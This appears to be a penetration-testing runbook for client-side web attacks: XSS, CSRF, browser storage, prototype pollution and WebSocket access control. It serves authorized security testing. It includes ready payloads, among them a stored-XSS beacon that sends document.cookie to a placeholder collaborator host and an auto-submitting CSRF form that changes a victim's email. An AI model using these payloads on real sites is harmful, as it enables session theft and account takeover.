# Runbook: Client-side attack testing

Client-side vulnerabilities execute in the browser rather than on the server. The target is
not the server's data — it is the victim's session, their credentials, and the actions they
can be caused to perform without their knowledge. Modern applications have expanded this
surface considerably: single-page applications expose large amounts of logic in JavaScript,
and features like WebSockets, browser storage, and cross-origin sharing each introduce their
own attack surface.

## Prerequisites

- Burp Suite Pro with DOM Invader browser extension enabled.
- A browser with DevTools available for runtime inspection.
- An account to test stored XSS payloads from another perspective.

## Phase 1: XSS

### Reflected XSS

For every parameter that appears in the response, test whether it is HTML-encoded. Start
with a minimal probe that produces a visible result without depending on a specific context:

```html
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
```

Check where the input appears in the response source. The payload structure depends on
the context: inside an HTML attribute, inside a JavaScript string, inside a JSON value,
or inside a template literal. Each requires a different escape sequence.

For JavaScript string context:

```
"-alert(1)-"
\"-alert(1)//
```

For template literal context:

```
${alert(1)}
```

### Stored XSS

For every input field whose value is displayed to other users (comments, profile names,
messages, titles, descriptions), inject a payload that sends a beacon:

```html
<img src=x onerror="fetch('https://YOUR_COLLABORATOR_PAYLOAD?c='+document.cookie)">
```

Log into a second account and browse to the page where the content is displayed. If the
Collaborator receives a request containing the session cookie, stored XSS is confirmed.

### DOM-based XSS

DOM Invader in Burp's browser automatically identifies DOM sources and sinks. Browse the
application with DOM Invader active and review any flagged sources.

Manually test URL hash and query parameter values that are read via `location.hash`,
`location.search`, or `document.URL` and written to the DOM via `innerHTML`,
`document.write`, or `eval`:

```javascript
// Test: does the page read this value and write it unsafely?
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page?q=<img src=x onerror=alert(1)>
```

## Phase 2: CSRF

CSRF vulnerabilities exist when a state-changing request can be triggered by a third-party
page. Three conditions must hold: the request relies on a cookie for authentication, the
cookie is sent with cross-site requests (no `SameSite=Strict`), and the request lacks an
unpredictable token tied to the user's session.

For every state-changing endpoint (POST, PUT, DELETE), check the request for a CSRF token.
If none is present:

```html
<!-- Test whether a cross-origin form submission succeeds -->
<form action="https://target.com/api/v1/email/update" method="POST">
  <input name="email" value="attacker@attacker.com">
</form>
<script>document.forms[0].submit()</script>
```

Also test whether a valid CSRF token can be replaced with one from another session, or
whether the token's mere presence (regardless of value) satisfies the check.

## Phase 3: Browser storage

Inspect `localStorage` and `sessionStorage` in DevTools (Application tab) for sensitive
data: session tokens, user identifiers, API keys, PII, and access control flags stored
client-side.

```javascript
// Execute in browser console
Object.entries(localStorage)
Object.entries(sessionStorage)
```

If a security-sensitive flag is stored in localStorage (such as `isAdmin: false`), test
whether changing it client-side has any effect. Any security decision made based on
client-side storage is a vulnerability.

## Phase 4: Prototype pollution

Prototype pollution allows an attacker to inject properties into JavaScript's Object
prototype, affecting all objects in the application. Sources include URL query parameters,
JSON inputs, and URL hash fragments.

Test with Burp DOM Invader's prototype pollution scanner, or manually inject payloads:

```
https://target.com/?__proto__[testProperty]=polluted
https://target.com/?constructor.prototype.testProperty=polluted
https://target.com/#__proto__[testProperty]=polluted
```

Open the browser console and check whether the property is accessible:

```javascript
({}).testProperty  // returns "polluted" if vulnerable
```

Once pollution is confirmed, identify gadgets: application code that reads an undefined
property from an object and uses its value in a security-sensitive operation (assignment
to innerHTML, eval, fetch URL, etc.).

## Phase 5: WebSocket testing

For applications using WebSockets, proxy the WebSocket traffic through Burp (visible in
the HTTP history under the WS tab). Test whether the WebSocket handshake enforces the same
access controls as the HTTP API:

1. Authenticate as Account A and open a WebSocket connection.
2. Capture the connection upgrade request.
3. Replace the session token with Account B's token.
4. Test whether Account B's WebSocket session can receive Account A's messages.

Also test whether messages sent over the WebSocket are validated with the same rigor as
HTTP requests. Mass assignment, injection, and business logic vulnerabilities can all exist
in WebSocket message handlers.

## Output

- XSS findings: type (reflected/stored/DOM), context, demonstrated session theft or
  account action where possible.
- CSRF findings: affected endpoints, whether the exploit requires user interaction.
- Browser storage findings: what sensitive data is exposed and what is controllable.
- Prototype pollution findings: confirmed sources, any gadgets producing exploitable impact.
- WebSocket findings: access control failures, injection in message handlers.

## Techniques

- [Cross-site scripting (XSS)](../techniques/xss.md)
- [CSRF](../techniques/csrf.md)
- [Same-origin policy](../techniques/sop.md)
- [WebSockets](../techniques/sockets.md)
- [Prototype pollution](../techniques/pollution.md)
